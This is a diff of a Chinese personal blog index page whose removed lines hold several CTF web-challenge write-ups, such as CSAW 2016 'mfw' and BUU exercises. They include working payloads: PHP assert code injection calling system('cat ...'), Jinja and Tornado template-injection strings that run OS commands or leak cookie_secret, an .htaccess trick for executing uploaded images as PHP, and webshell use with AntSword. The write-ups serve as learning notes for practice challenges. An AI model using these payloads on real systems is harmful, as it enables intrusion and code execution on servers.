class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>涉及到了assert的知识点：</p>
-<blockquote>
-<p>assert — 检查一个断言是否为 FALSE</p>
-<p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
-<p>如本题：assert(“strpos(‘$file’, ‘..’) === false”) 执行了strpos函数对file进行了检查，若没有检查到..，则继续运行；若检查到，则抛出warning并die(“Detected hacking attempt!”)。</p>
-</blockquote>
-<p>重点是对于assert函数的利用，控制file使之执行指定的代码。</p>
-<p>eg：?page=’) or eval(“echo 9*9;”);//</p>
-<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304134649985.png" alt="image-20210304134649985" style="zoom:80%;" />
-
-<p>不是很懂为什么会输出Detected hacking attempt!，本地尝试：</p>
-<p>?page=’) or eval(“print(8*9);”);//</p>
-<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304141243600.png" alt="image-20210304141243600" style="zoom:80%;" />
-
-<p>抑制住了疯狂报错……输出了bool（false），大概是语法或是什么地方出了一点问题……就挺迷的……</p>
-<p>?page=’) or system(“cat templates/flag.php”);//</p>
-<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304135359125.png" alt="image-20210304135359125" style="zoom:80%;" />
-
-<p>得到flag</p>
-<p>关于or可用点号替换的推测：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/alsf/p/9618070.html">深入解析PHP中逗号与点号的区别</a></p>
-<blockquote>
-<p>……</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/26/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/26/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/" class="post-title-link" itemprop="url">网鼎杯-2020-青龙组-AreUSerialz</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-02-26 11:21:24 / 修改时间：15:20:54" itemprop="dateCreated datePublished" datetime="2021-02-26T11:21:24+08:00">2021-02-26</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="网鼎杯-2020-青龙组-AreUSerialz"></a>网鼎杯-2020-青龙组-AreUSerialz</h4>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/02/26/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/24/Buu%E4%BA%94%E9%81%93%E9%A2%98%EF%BC%9AExec%E3%80%81Knife%E3%80%81easy_tornado%E3%80%81fake%20google%E3%80%81%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/24/Buu%E4%BA%94%E9%81%93%E9%A2%98%EF%BC%9AExec%E3%80%81Knife%E3%80%81easy_tornado%E3%80%81fake%20google%E3%80%81%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/" class="post-title-link" itemprop="url">buu五道题：Exec、Knife、easy_tornado、fake google、你传你🐎呢</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-02-24 11:30:06" itemprop="dateCreated datePublished" datetime="2021-02-24T11:30:06+08:00">2021-02-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-01 14:55:19" itemprop="dateModified" datetime="2021-03-01T14:55:19+08:00">2021-03-01</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <a id="more"></a>
-
-<h4 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><blockquote>
-<p>这个好像当时没有写wp，补一下</p>
-</blockquote>
-<p>今年的ACTF有个题倒是和这个差不多，感觉这个简单一些吧……远程的命令执行</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224115130403.png" alt="image-20210224115130403"></p>
-<p>发现根目录有flag，cat：</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224115214111.png" alt="image-20210224115214111"></p>
-<h4 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h4><h6 id="1-题目：-1"><a href="#1-题目：-1" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程：-1"><a href="#2-过程：-1" class="headerlink" title="2.过程："></a>2.过程：</h6><p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224115601387.png" alt="image-20210224115601387"></p>
-<p>网站给自己下了个马……直接用蚁剑连：</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224115730605.png" alt="image-20210224115730605"></p>
-<h4 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h4><h6 id="1-题目：-2"><a href="#1-题目：-2" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程：-2"><a href="#2-过程：-2" class="headerlink" title="2.过程："></a>2.过程：</h6><p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224141404866.png" alt="image-20210224141404866"></p>
-<blockquote>
-<p>flag in /fllllllllllllag</p>
-<p>Tornado是一种 Web 服务器软件的开源版本。</p>
-<p>Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</p>
-</blockquote>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224141715722.png" alt="image-20210224141715722"></p>
-<p>提示：</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224141740750.png" alt="image-20210224141740750"></p>
-<p>应该就是后面的验证……改掉之后是error界面</p>
-<p>?msg=1 则页面显示是1，页面有严格的过滤……</p>
-<p>在Tornado模板中：</p>
-<blockquote>
-<p>二、两种表现形式</p>
-<p>（一）模板变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; variable_name &#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">欢迎&#123;&#123; username &#125;&#125;登录</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
-
-<p>它也可以是python表达式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 1 + 1 &#125;&#125;</span><br><span class="line">&#123;&#123; time.time() &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>（二）模板命令</p>
-<p>其实就是，大括号百分号所包裹的python语法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% if 1 %&#125;</span><br><span class="line"> this is if</span><br><span class="line">&#123;% end %&#125;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>搜索cookie_secret，发现结果与tornado有关，官网的搜索结果：</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224154446715.png" alt="image-20210224154446715"></p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224163500572.png" alt="image-20210224163500572"></p>
-<p>这是RequestHandler中包含application的意思吗……</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>中的解释：</p>
-<blockquote>
-<p>handler 指向RequestHandler</p>
-<p>而RequestHandler.settings又指向self.application.settings</p>
-<p>所以handler.settings就指向RequestHandler.application.settings了</p>
-</blockquote>
-<p>通过handler.settings获得环境变量？</p>
-<p>使用案例：</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224165102865.png" alt="image-20210224165102865"></p>
-<p>（self类似于this）</p>
-<p>细节上还不是很懂……大概是可以指向RequestHandler，获取内部的变量吧。</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224165551945.png" alt="image-20210224165551945"></p>
-<p>获取到cookie_secret，加密：</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224170137490.png" alt="image-20210224170137490"></p>
-<p>访问获取flag：</p>
-<p><img src="/images/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/image-20210224170208821.png" alt="image-20210224170208821"></p>
-<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><h6 id="1-题目：-3"><a href="#1-题目：-3" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程：-3"><a href="#2-过程：-3" class="headerlink" title="2.过程："></a>2.过程：</h6><p>直接上来让上传木马……过滤了后缀名</p>
-<p>之前的一道题是.user.ini的利用，要求在上传到.user.ini的文件夹下，也要有可执行的正常php文件。</p>
-<p>这个并没有……应该是提到的.htaccess文件</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cmzhuang/article/details/53537591">.htaccess详解及.htaccess参数说明</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.php.cn/div-tutorial-416140.html">.htaccess是什么文件？有什么用途？</a></p>
-<p>这里可以用<code>AddType application/x-httpd-php .jpg</code>，指定将jpg文件解析为php文件。    </p>
-<p>上传之后用antsword连接……</p>
-<p>![image-20210228184753486](/images/Buu五道题：Exec、Knife、easy_tornado、fake google、你传你🐎呢/image-20210228184753486.png)</p>
-<p>在根目录找到flag。</p>
-<h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><h6 id="1-题目：-4"><a href="#1-题目：-4" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程：-4"><a href="#2-过程：-4" class="headerlink" title="2.过程："></a>2.过程：</h6><p>搜索一下：</p>
-<p>![image-20210226233025995](/images/Buu四道题：Exec、Knife、easy_tornado、fake google/image-20210226233025995.png)</p>
-<p>此时页面的源码为：</p>
-<p>![image-20210226233149495](/images/Buu四道题：Exec、Knife、easy_tornado、fake google/image-20210226233149495.png)</p>
-<p>ssti……用一下forgetful的解就过了，记一下吧……：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>（这篇好水……）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/24/ASIS-2019-Unicorn-shop/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/24/ASIS-2019-Unicorn-shop/" class="post-title-link" itemprop="url">ASIS-2019-Unicorn-shop</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-02-24 11:00:43 / 修改时间：11:21:08" itemprop="dateCreated datePublished" datetime="2021-02-24T11:00:43+08:00">2021-02-24</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>题目要我们购买独角兽，实际上只有第四种可以购买……</p>
-<p><img src="/images/ASIS-2019-Unicorn-shop/image-20210224110437694.png" alt="image-20210224110437694"></p>
-<p>只可以输入一个字符，如果不填入内容提交，网页会发生报错：</p>
-<p><img src="/images/ASIS-2019-Unicorn-shop/image-20210224110612819.png" alt="image-20210224110612819"></p>
-<blockquote>
-<p>numeric：</p>
-<p><strong>语法</strong>：unicodedata.numeric(chr[, default])</p>
-<p><strong>描述</strong>：将Unicode字符(chr)转换为等效的数值。以浮点形式返回【与chr相对应的数值】。若未定义这样的值，则返回默认值default；若未指定默认值，则抛出ValueError异常。（把一个表示数字的字符转换为浮点数。比如，可将’5’、’五’转换数值输出。与digit()不同是numeric()可以转换任意表示数值的字符，不仅仅限于0到9的字符）</p>
-</blockquote>
-<p>不同的Unicode字符可以对应不同的数值，可以在<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode%E6%9F%A5%E8%AF%A2%EF%BC%9A">https://www.compart.com/en/unicode查询：</a></p>
-<p><img src="/images/ASIS-2019-Unicorn-shop/image-20210224111552294.png" alt="image-20210224111552294"></p>
-<p><img src="/images/ASIS-2019-Unicorn-shop/image-20210224111622099.png" alt="image-20210224111622099"></p>
-<p>官方wp：<a target="_blank" rel="noopener" href="https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis">https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis</a></p>
-<p>dalao：<a target="_blank" rel="noopener" href="https://gality.cn/?p=123#%E7%AD%89%E4%BB%B7%E5%BD%A2%E5%BC%8F">https://gality.cn/?p=123#%E7%AD%89%E4%BB%B7%E5%BD%A2%E5%BC%8F</a></p>
-<p>……</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1140,7 +1160,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-count">61</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
